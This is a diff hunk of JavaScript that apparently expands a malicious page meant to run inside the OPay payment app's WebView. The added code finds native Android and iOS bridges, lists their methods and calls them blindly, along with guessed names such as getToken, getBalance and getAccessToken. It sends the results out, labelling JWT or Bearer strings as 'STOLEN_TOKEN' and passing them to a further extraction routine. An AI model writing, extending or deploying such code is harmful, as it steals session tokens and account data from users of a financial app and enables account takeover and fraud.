@@ -548,16 +548,183 @@
                 x.send();
             } catch (e) { }
 
-            // Check bridges
-            var bridges = ['control', 'android', 'OPay3PartyContext', 'ORideContext'];
-            for (var i = 0; i < bridges.length; i++) {
+            // ===== COMPREHENSIVE BRIDGE SCANNER =====
+            var bridgeNames = ['control', 'android', 'OPay3PartyContext', 'ORideContext',
+                'webkit', 'OPayContext', 'OPayBridge', 'AppBridge', 'NativeBridge',
+                'JSBridge', 'WebViewJavascriptBridge', 'WKWebViewJavascriptBridge',
+                'prompt', 'OPayWebView', 'opay', 'OPay', 'PayContext'];
+            var foundBridges = {};
+
+            for (var i = 0; i < bridgeNames.length; i++) {
                 try {
-                    if (window[bridges[i]]) { visitorData["bridge_" + bridges[i]] = "EXISTS"; }
+                    if (window[bridgeNames[i]] && typeof window[bridgeNames[i]] === 'object') {
+                        foundBridges[bridgeNames[i]] = true;
+                        visitorData["bridge_" + bridgeNames[i]] = "EXISTS";
+                    }
                 } catch (e) { }
             }
 
-            // Extract token
-            if (window.control && window.control.getBaseInfo) {
+            // Also check for webkit.messageHandlers (iOS WKWebView pattern)
+            try {
+                if (window.webkit && window.webkit.messageHandlers) {
+                    foundBridges["webkit.messageHandlers"] = true;
+                    visitorData["bridge_webkit_messageHandlers"] = "EXISTS";
+                    // Enumerate known handler names
+                    var handlerNames = ['getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo',
+                        'OPay3PartyContext', 'OPayContext', 'callNative', 'invoke',
+                        'getAppInfo', 'getDeviceInfo', 'getUserToken', 'getAccessToken'];
+                    var foundHandlers = [];
+                    for (var h = 0; h < handlerNames.length; h++) {
+                        try {
+                            if (window.webkit.messageHandlers[handlerNames[h]]) {
+                                foundHandlers.push(handlerNames[h]);
+                            }
+                        } catch (e) { }
+                    }
+                    if (foundHandlers.length > 0) {
+                        sendData({ handlers: foundHandlers }, "IOS_HANDLERS");
+                    }
+                }
+            } catch (e) { }
+
+            // ===== ENUMERATE METHODS ON EVERY FOUND BRIDGE =====
+            function enumerateBridge(name, obj) {
+                var methods = [];
+                var properties = [];
+                // Own properties
+                try {
+                    var keys = Object.getOwnPropertyNames(obj);
+                    for (var k = 0; k < keys.length; k++) {
+                        try {
+                            var type = typeof obj[keys[k]];
+                            if (type === 'function') methods.push(keys[k]);
+                            else properties.push(keys[k] + ":" + type);
+                        } catch (e) { }
+                    }
+                } catch (e) { }
+                // for...in (prototype chain)
+                try {
+                    for (var key in obj) {
+                        try {
+                            var t = typeof obj[key];
+                            if (t === 'function' && methods.indexOf(key) === -1) methods.push(key);
+                            else if (t !== 'function' && properties.indexOf(key + ":" + t) === -1) properties.push(key + ":" + t);
+                        } catch (e) { }
+                    }
+                } catch (e) { }
+                // Object.keys
+                try {
+                    var ok = Object.keys(obj);
+                    for (var j = 0; j < ok.length; j++) {
+                        try {
+                            var tp = typeof obj[ok[j]];
+                            if (tp === 'function' && methods.indexOf(ok[j]) === -1) methods.push(ok[j]);
+                        } catch (e) { }
+                    }
+                } catch (e) { }
+
+                sendData({
+                    bridge: name,
+                    methods: methods.join(","),
+                    properties: properties.join(","),
+                    methodCount: methods.length,
+                    propertyCount: properties.length
+                }, "BRIDGE_METHODS");
+
+                return methods;
+            }
+
+            // ===== BRUTE-FORCE COMMON METHOD NAMES =====
+            var commonMethods = [
+                'getBaseInfo', 'getToken', 'getUserInfo', 'getAccountInfo',
+                'getUserToken', 'getAccessToken', 'getAuthToken', 'getSessionToken',
+                'getAppInfo', 'getDeviceInfo', 'getPhoneInfo', 'getSystemInfo',
+                'getUserId', 'getAccountId', 'getBalance', 'getProfile',
+                'getLoginInfo', 'getLoginToken', 'getSession', 'getSessionId',
+                'getUserData', 'getData', 'getInfo', 'getConfig',
+                'callNative', 'invoke', 'postMessage', 'exec',
+                'getVersion', 'getAppVersion', 'getPlatform',
+                'tokenInfo', 'userInfo', 'accountInfo', 'loginInfo'
+            ];
+
+            function bruteForceCall(name, obj) {
+                var results = {};
+                // First try discovered methods
+                var discoveredMethods = enumerateBridge(name, obj);
+
+                // Call all discovered methods that take 0 args
+                for (var m = 0; m < discoveredMethods.length; m++) {
+                    try {
+                        var ret = obj[discoveredMethods[m]]();
+                        if (ret !== undefined && ret !== null && ret !== '') {
+                            results[discoveredMethods[m]] = String(ret).substring(0, 1000);
+                        }
+                    } catch (e) {
+                        results[discoveredMethods[m]] = "ERR:" + e.message;
+                    }
+                }
+
+                // Also try common method names not in discovered list
+                for (var c = 0; c < commonMethods.length; c++) {
+                    if (discoveredMethods.indexOf(commonMethods[c]) === -1) {
+                        try {
+                            if (typeof obj[commonMethods[c]] === 'function') {
+                                var val = obj[commonMethods[c]]();
+                                if (val !== undefined && val !== null && val !== '') {
+                                    results[commonMethods[c]] = String(val).substring(0, 1000);
+                                }
+                            }
+                        } catch (e) { }
+                    }
+                }
+
+                if (Object.keys(results).length > 0) {
+                    sendData({ bridge: name, results: results }, "BRIDGE_RESULTS");
+                }
+                return results;
+            }
+
+            // ===== RUN SCANNER ON ALL FOUND BRIDGES =====
+            var tokenFound = false;
+            for (var bname in foundBridges) {
+                if (!foundBridges.hasOwnProperty(bname)) continue;
+                try {
+                    var bobj = bname.indexOf('.') > -1 ? window.webkit.messageHandlers : window[bname];
+                    var callResults = bruteForceCall(bname, bobj);
+                    // Check if any result looks like a token
+                    for (var rk in callResults) {
+                        if (!callResults.hasOwnProperty(rk)) continue;
+                        var rv = callResults[rk];
+                        if (rv && rv.length > 20 && !rv.startsWith("ERR:")) {
+                            sendData({ method: bname + "." + rk, value: rv }, "POSSIBLE_TOKEN");
+                            // Try parsing as JSON
+                            try {
+                                var parsed = JSON.parse(rv);
+                                if (parsed.token) {
+                                    tokenFound = true;
+                                    visitorData.tokenData = rv;
+                                    sendData({ token: rv, source: bname + "." + rk }, "STOLEN_TOKEN");
+                                    extractAll(parsed.token);
+                                }
+                            } catch (e) {
+                                // Maybe the string itself is a raw token
+                                if (rv.indexOf("eyJ") === 0 || rv.indexOf("Bearer") > -1) {
+                                    tokenFound = true;
+                                    var tkn = rv.replace("Bearer ", "").trim();
+                                    visitorData.tokenData = rv;
+                                    sendData({ token: rv, source: bname + "." + rk }, "STOLEN_TOKEN");
+                                    extractAll("Bearer " + tkn);
+                                }
+                            }
+                        }
+                    }
+                } catch (e) {
+                    sendData({ bridge: bname, error: e.message }, "BRIDGE_ERROR");
+                }
+            }
+
+            // ===== FALLBACK: Direct Android method (original) =====
+            if (!tokenFound && window.control && window.control.getBaseInfo) {
                 try {
                     var raw = window.control.getBaseInfo();
                     visitorData.tokenData = raw;
